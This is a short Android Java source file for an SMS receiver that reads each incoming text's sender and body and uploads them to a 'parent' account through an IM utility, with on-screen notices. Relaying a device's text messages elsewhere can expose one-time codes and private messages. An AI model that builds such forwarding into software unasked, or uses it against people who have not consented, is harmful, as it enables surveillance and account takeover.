package com.openim.tophone.utils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.openim.tophone.base.BaseApp;
import com.openim.tophone.enums.ActionEnums;
import com.openim.tophone.openim.IMUtil;

public class SmsBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Toast.makeText(BaseApp.inst(),"监听到短信信息，正在处理中...",Toast.LENGTH_LONG).show();
        if (intent != null && "android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            for (Object pdu : pdus) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format"));
                if (smsMessage == null) continue;

                String sender = smsMessage.getOriginatingAddress();
                String messageBody = smsMessage.getMessageBody();

                if (sender != null && sender.length() >= 11) {
                    IMUtil.uploadMsg2Parent(ActionEnums.RECEIVED_SMS.getType(), sender, messageBody);
                    Toast.makeText(BaseApp.inst(),"监听到短信信息，已上报！",Toast.LENGTH_LONG).show();
                    break; // 处理一条后就退出
                }
            }
        }
    }
}
